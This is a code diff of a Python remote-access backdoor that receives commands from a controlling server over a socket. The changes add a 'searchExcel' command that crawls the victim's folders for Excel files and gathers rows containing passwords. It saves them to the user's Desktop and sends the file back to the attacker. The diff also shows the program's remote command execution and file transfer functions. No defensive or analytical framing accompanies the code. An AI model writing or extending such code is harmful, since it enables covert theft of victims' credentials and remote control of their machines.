@@ -30,10 +30,14 @@ def tuneConnection():
 
 
 def findPasswords(directory):
+    global passwords
     passwords = []
+    global counter
+    counter = 0
     for root, dirs, files in os.walk(directory):
         for file in files:
             if file.endswith(".xlsx"):
+                counter += 1
                 filepath = os.path.join(root, file)
                 df = pd.read_excel(filepath)
                 for index, row in df.iterrows():
@@ -44,18 +48,20 @@ def findPasswords(directory):
 
     if passwords:
         # Write filtered rows to a new Excel file
+        global current_user
+        current_user = os.getlogin()
         global excelPath
-        excelPath = "C:\\Users\\siequia\\Desktop\\supersecretpasswords\\passwords.xlsx"
+        excelPath = f"C:\\Users\\{current_user}\\Desktop\\passwords.xlsx"
         wb = Workbook()
         ws = wb.active
         for row in passwords:
             ws.append(row)
         wb.save(excelPath)
-        print("[+] Passwords written to passwords.xlsx")
+        return True
     else:
-        print("No .xlsx files found")
+        return False
 
-    return passwords
+
 
 
 def letGrab(mySocket, path):
@@ -66,7 +72,6 @@ def letGrab(mySocket, path):
             mySocket.send(packet)
             packet = f.read(5000)
         mySocket.send("DONE".encode())
-
     else:
         mySocket.send("File not found".encode())
 
@@ -84,7 +89,6 @@ def letSend(mySocket, path, fileName):
             if "File not found".encode() in data:
                 break
             f.write(data)
-
 
 def execute_command(command):
     try:
@@ -122,15 +126,20 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
                 break
 
+        # Command format: searchExcel*<folder path>
+        # Example: searchExcel*C:\Users\{current_user}\Desktop
         elif 'searchExcel' in command.decode():
             searchExcel, directory = command.decode().split("*")
             try:
-                passwords = findPasswords(directory)
+                findPasswords(directory)
                 if passwords:
-                    print(passwords)
                     letGrab(mySocket, excelPath)
-                else:
+                elif counter == 0:
+                    mySocket.send("No .xlsx files found".encode())
                     print("No .xlsx files found (in shell call)")
+                else:
+                    mySocket.send("No passwords found".encode())
+                    print("No passwords found (in shell call)")
             except Exception as e:
                 informToServer = "[+] Some error occurred. " + str(e)
                 mySocket.send(informToServer.encode())
